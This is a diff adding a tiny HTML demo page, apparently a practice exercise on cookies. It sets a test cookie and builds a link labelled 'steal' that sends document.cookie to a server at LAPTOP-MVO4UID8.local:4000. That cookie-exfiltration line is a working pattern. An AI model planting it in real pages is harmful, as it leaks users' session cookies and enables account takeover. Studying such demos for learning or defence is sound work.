@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <button id="createCookieBuuton">Create Cookie</button>
+    <a id="steal">steal</a>
+    <a href="http://example.com">Go to example.com</a>
+    <a href="http://www.example.com">Go to www.example.com</a>
+    <img src="http://LAPTOP-MVO4UID8.local:4000/img" alt="cookie">
+    <script>
+        document.getElementById('createCookieBuuton').addEventListener('click', e=>{
+            document.cookie = "shifa=703";
+            console.log('Cookie created');
+        });
+        const steal=document.getElementById('steal');
+        steal.href="http://LAPTOP-MVO4UID8.local:4000/steal?v="+document.cookie;
+    </script>
+    </body>
+</html>
